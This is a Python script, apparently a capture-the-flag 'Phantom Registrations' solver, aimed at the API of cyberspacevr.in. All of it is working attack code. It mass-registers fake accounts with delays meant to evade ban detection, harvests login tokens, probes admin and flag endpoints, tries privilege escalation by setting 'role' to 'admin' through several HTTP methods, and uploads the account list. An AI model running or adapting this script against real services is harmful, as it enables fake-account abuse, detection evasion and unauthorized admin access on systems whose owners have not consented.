#!/usr/bin/env python3
"""
Phantom Registrations - Smart Solver
Avoids bans and looks for privilege escalation
"""

import requests
import time
import csv
import json

API_BASE = "https://api.cyberspacevr.in"
WEB_BASE = "https://cyberspacevr.in"

def slow_register_accounts(count=100):
    """Register accounts slowly to avoid ban detection"""
    print(f"[*] Registering {count} accounts slowly...")
    
    created = []
    for i in range(1, count + 1):
        try:
            data = {
                'username': f'phantom_{i:05d}',
                'email': f'phantom{i:05d}@ctftest.local',
                'password': f'PhantomPass{i:05d}!@#'
            }
            
            resp = requests.post(f"{API_BASE}/v1/auth/register", json=data, timeout=10)
            
            if resp.status_code in [200, 201]:
                print(f"  ✓ {data['username']} registered")
                created.append(data)
                
                # Login immediately to get token
                login_resp = requests.post(f"{API_BASE}/v1/auth/login", json={
                    'username': data['username'],
                    'password': data['password']
                }, timeout=10)
                
                if login_resp.status_code == 200:
                    token = login_resp.json().get('token')
                    data['token'] = token
                    print(f"    Token: {token[:50]}...")
            else:
                print(f"  ✗ {data['username']}: {resp.status_code} - {resp.text[:100]}")
            
            # Slow down to avoid detection (2 seconds between registrations)
            time.sleep(2)
            
            if i % 10 == 0:
                print(f"[+] Progress: {i}/{count}")
                
        except Exception as e:
            print(f"  ✗ Error: {e}")
    
    return created

def check_admin_endpoints(token):
    """Check for admin/privilege escalation endpoints"""
    print("\n[*] Checking for admin endpoints...")
    
    headers = {
        'Authorization': f'Bearer {token}',
        'Content-Type': 'application/json'
    }
    
    endpoints = [
        '/v1/admin/users',
        '/v1/admin/roles',
        '/v1/users/role',
        '/v1/users/promote',
        '/v1/auth/role',
        '/v1/admin/flag',
        '/v1/flag',
        '/v1/challenge/flag',
    ]
    
    for endpoint in endpoints:
        try:
            resp = requests.get(f"{API_BASE}{endpoint}", headers=headers, timeout=5)
            if resp.status_code != 404:
                print(f"  [+] {endpoint} -> {resp.status_code}")
                print(f"      {resp.text[:200]}")
        except:
            pass

def try_role_manipulation(username, token):
    """Try to change user role to admin"""
    print(f"\n[*] Attempting role manipulation for {username}...")
    
    headers = {
        'Authorization': f'Bearer {token}',
        'Content-Type': 'application/json'
    }
    
    # Try different role change methods
    attempts = [
        ('PATCH', '/v1/users/me', {'role': 'admin'}),
        ('PUT', '/v1/users/me', {'role': 'admin'}),
        ('POST', '/v1/users/role', {'role': 'admin'}),
        ('POST', '/v1/admin/promote', {'username': username}),
        ('PATCH', f'/v1/users/{username}', {'role': 'admin'}),
    ]
    
    for method, endpoint, data in attempts:
        try:
            if method == 'PATCH':
                resp = requests.patch(f"{API_BASE}{endpoint}", headers=headers, json=data, timeout=5)
            elif method == 'PUT':
                resp = requests.put(f"{API_BASE}{endpoint}", headers=headers, json=data, timeout=5)
            else:
                resp = requests.post(f"{API_BASE}{endpoint}", headers=headers, json=data, timeout=5)
            
            if resp.status_code in [200, 201]:
                print(f"  ✓ SUCCESS: {method} {endpoint}")
                print(f"    Response: {resp.text}")
                return True
            elif resp.status_code != 404:
                print(f"  [!] {method} {endpoint} -> {resp.status_code}: {resp.text[:100]}")
        except:
            pass
    
    return False

def check_registration_count():
    """Check if there's an endpoint showing registration count"""
    print("\n[*] Checking registration statistics...")
    
    endpoints = [
        '/v1/stats',
        '/v1/users/count',
        '/v1/registrations/count',
        '/v1/admin/stats',
        '/api/stats',
    ]
    
    for endpoint in endpoints:
        try:
            resp = requests.get(f"{API_BASE}{endpoint}", timeout=5)
            if resp.status_code == 200:
                print(f"  [+] {endpoint}:")
                print(f"      {resp.text}")
        except:
            pass

def submit_csv_for_flag(csv_file='phantom_accounts.csv'):
    """Try to submit CSV to get flag"""
    print(f"\n[*] Attempting to submit {csv_file}...")
    
    endpoints = [
        '/v1/challenge/submit',
        '/v1/submit',
        '/v1/phantom/submit',
        '/v1/registrations/submit',
    ]
    
    try:
        with open(csv_file, 'rb') as f:
            files = {'file': (csv_file, f, 'text/csv')}
            
            for endpoint in endpoints:
                try:
                    resp = requests.post(f"{API_BASE}{endpoint}", files=files, timeout=10)
                    if resp.status_code != 404:
                        print(f"  [+] {endpoint} -> {resp.status_code}")
                        print(f"      {resp.text}")
                        
                        if 'flag' in resp.text.lower():
                            print(f"\n[!] FLAG FOUND!")
                            return resp.text
                except Exception as e:
                    pass
    except FileNotFoundError:
        print(f"  [-] {csv_file} not found")
    
    return None

def main():
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║         PHANTOM REGISTRATIONS - SMART SOLVER              ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Step 1: Register a small batch slowly
    accounts = slow_register_accounts(count=50)
    
    if not accounts:
        print("[-] No accounts created successfully")
        return
    
    # Save accounts
    with open('phantom_accounts_smart.csv', 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=['username', 'email', 'password', 'token'])
        writer.writeheader()
        writer.writerows(accounts)
    
    print(f"\n[+] Created {len(accounts)} accounts")
    
    # Step 2: Use first account to explore
    if accounts and 'token' in accounts[0]:
        token = accounts[0]['token']
        username = accounts[0]['username']
        
        check_admin_endpoints(token)
        try_role_manipulation(username, token)
        check_registration_count()
    
    # Step 3: Try submitting CSV
    submit_csv_for_flag('phantom_accounts_smart.csv')
    
    print("\n[*] Next steps:")
    print("    1. Check if accounts are active (not banned)")
    print("    2. Continue registering more accounts if needed")
    print("    3. Look for threshold trigger (5000 accounts)")

if __name__ == "__main__":
    main()
